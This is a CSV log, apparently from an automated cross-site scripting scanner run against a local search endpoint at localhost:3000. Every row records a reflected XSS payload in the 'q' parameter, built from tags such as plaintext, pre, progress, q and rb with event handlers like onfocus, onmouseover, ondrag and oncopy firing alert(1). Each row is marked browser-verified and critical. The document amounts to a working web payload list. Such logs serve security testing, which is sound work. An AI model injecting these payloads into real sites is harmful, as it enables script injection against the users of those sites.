Timestamp,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<plaintext id=x tabindex=1 onbeforeactivate=alert(1)></plaintext>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<plaintext id=x tabindex=1 onbeforedeactivate=alert(1)></plaintext><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext><input id=y autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<plaintext id=x tabindex=1 onfocus=alert(1)></plaintext>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<plaintext id=x tabindex=1 onfocusin=alert(1)></plaintext>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext onbeforecopy=""alert(1)"" contenteditable>test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext onbeforecut=""alert(1)"" contenteditable>test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext onbeforepaste=""alert(1)"" contenteditable>test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<plaintext onblur=alert(1) tabindex=1 id=x></plaintext><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext onclick=""alert(1)"">test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext oncontextmenu=""alert(1)"">test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext oncopy=""alert(1)"" contenteditable>test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext oncut=""alert(1)"" contenteditable>test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext ondblclick=""alert(1)"">test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<plaintext onfocusout=alert(1) tabindex=1 id=x></plaintext><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext onkeydown=""alert(1)"" contenteditable>test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext onkeypress=""alert(1)"" contenteditable>test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext onkeyup=""alert(1)"" contenteditable>test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext onmousedown=""alert(1)"">test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext onmouseenter=""alert(1)"">test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext onmouseleave=""alert(1)"">test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext onmousemove=""alert(1)"">test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext onmouseout=""alert(1)"">test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext onmouseover=""alert(1)"">test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext onmouseup=""alert(1)"">test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext onpaste=""alert(1)"" contenteditable>test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre draggable=""true"" ondrag=""alert(1)"">test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre draggable=""true"" ondragend=""alert(1)"">test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre draggable=""true"" ondragenter=""alert(1)"">test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre draggable=""true"" ondragleave=""alert(1)"">test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre draggable=""true"" ondragstart=""alert(1)"">test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<pre id=x tabindex=1 onactivate=alert(1)></pre>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<pre id=x tabindex=1 onbeforeactivate=alert(1)></pre>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<pre id=x tabindex=1 onbeforedeactivate=alert(1)></pre><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<pre id=x tabindex=1 ondeactivate=alert(1)></pre><input id=y autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<pre id=x tabindex=1 onfocus=alert(1)></pre>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<pre id=x tabindex=1 onfocusin=alert(1)></pre>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre onbeforecopy=""alert(1)"" contenteditable>test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre onbeforecut=""alert(1)"" contenteditable>test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre onbeforepaste=""alert(1)"" contenteditable>test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<pre onblur=alert(1) tabindex=1 id=x></pre><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre onclick=""alert(1)"">test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre oncontextmenu=""alert(1)"">test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre oncopy=""alert(1)"" contenteditable>test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre oncut=""alert(1)"" contenteditable>test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre ondblclick=""alert(1)"">test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<pre onfocusout=alert(1) tabindex=1 id=x></pre><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre onkeydown=""alert(1)"" contenteditable>test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre onkeypress=""alert(1)"" contenteditable>test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre onkeyup=""alert(1)"" contenteditable>test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre onmousedown=""alert(1)"">test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre onmouseenter=""alert(1)"">test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre onmouseleave=""alert(1)"">test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre onmousemove=""alert(1)"">test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre onmouseout=""alert(1)"">test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre onmouseover=""alert(1)"">test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre onmouseup=""alert(1)"">test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<pre onpaste=""alert(1)"" contenteditable>test</pre>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress draggable=""true"" ondrag=""alert(1)"">test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress draggable=""true"" ondragend=""alert(1)"">test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress draggable=""true"" ondragenter=""alert(1)"">test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress draggable=""true"" ondragleave=""alert(1)"">test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress draggable=""true"" ondragstart=""alert(1)"">test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<progress id=x tabindex=1 onactivate=alert(1)></progress>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<progress id=x tabindex=1 onbeforeactivate=alert(1)></progress>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<progress id=x tabindex=1 onbeforedeactivate=alert(1)></progress><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<progress id=x tabindex=1 ondeactivate=alert(1)></progress><input id=y autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<progress id=x tabindex=1 onfocus=alert(1)></progress>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<progress id=x tabindex=1 onfocusin=alert(1)></progress>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress onbeforecopy=""alert(1)"" contenteditable>test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress onbeforecut=""alert(1)"" contenteditable>test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress onbeforepaste=""alert(1)"" contenteditable>test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<progress onblur=alert(1) tabindex=1 id=x></progress><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress onclick=""alert(1)"">test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress oncontextmenu=""alert(1)"">test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress oncopy=""alert(1)"" contenteditable>test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress oncut=""alert(1)"" contenteditable>test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress ondblclick=""alert(1)"">test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<progress onfocusout=alert(1) tabindex=1 id=x></progress><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress onkeydown=""alert(1)"" contenteditable>test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress onkeypress=""alert(1)"" contenteditable>test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress onkeyup=""alert(1)"" contenteditable>test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress onmousedown=""alert(1)"">test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress onmouseenter=""alert(1)"">test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress onmouseleave=""alert(1)"">test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress onmousemove=""alert(1)"">test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress onmouseout=""alert(1)"">test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress onmouseover=""alert(1)"">test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress onmouseup=""alert(1)"">test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<progress onpaste=""alert(1)"" contenteditable>test</progress>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q draggable=""true"" ondrag=""alert(1)"">test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q draggable=""true"" ondragend=""alert(1)"">test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q draggable=""true"" ondragenter=""alert(1)"">test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q draggable=""true"" ondragleave=""alert(1)"">test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q draggable=""true"" ondragstart=""alert(1)"">test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<q id=x tabindex=1 onactivate=alert(1)></q>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<q id=x tabindex=1 onbeforeactivate=alert(1)></q>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<q id=x tabindex=1 onbeforedeactivate=alert(1)></q><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<q id=x tabindex=1 ondeactivate=alert(1)></q><input id=y autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<q id=x tabindex=1 onfocus=alert(1)></q>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<q id=x tabindex=1 onfocusin=alert(1)></q>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q onbeforecopy=""alert(1)"" contenteditable>test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q onbeforecut=""alert(1)"" contenteditable>test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q onbeforepaste=""alert(1)"" contenteditable>test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<q onblur=alert(1) tabindex=1 id=x></q><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q onclick=""alert(1)"">test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q oncontextmenu=""alert(1)"">test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q oncopy=""alert(1)"" contenteditable>test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q oncut=""alert(1)"" contenteditable>test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q ondblclick=""alert(1)"">test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<q onfocusout=alert(1) tabindex=1 id=x></q><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q onkeydown=""alert(1)"" contenteditable>test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q onkeypress=""alert(1)"" contenteditable>test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q onkeyup=""alert(1)"" contenteditable>test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q onmousedown=""alert(1)"">test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q onmouseenter=""alert(1)"">test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q onmouseleave=""alert(1)"">test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q onmousemove=""alert(1)"">test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q onmouseout=""alert(1)"">test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q onmouseover=""alert(1)"">test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q onmouseup=""alert(1)"">test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<q onpaste=""alert(1)"" contenteditable>test</q>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<rb draggable=""true"" ondrag=""alert(1)"">test</rb>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<rb draggable=""true"" ondragend=""alert(1)"">test</rb>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<rb draggable=""true"" ondragenter=""alert(1)"">test</rb>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<rb draggable=""true"" ondragleave=""alert(1)"">test</rb>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<rb draggable=""true"" ondragstart=""alert(1)"">test</rb>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<rb id=x tabindex=1 onactivate=alert(1)></rb>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<rb id=x tabindex=1 onbeforeactivate=alert(1)></rb>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<rb id=x tabindex=1 onbeforedeactivate=alert(1)></rb><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<rb id=x tabindex=1 ondeactivate=alert(1)></rb><input id=y autofocus>,RAW_REFLECTION,Yes,alert,Critical
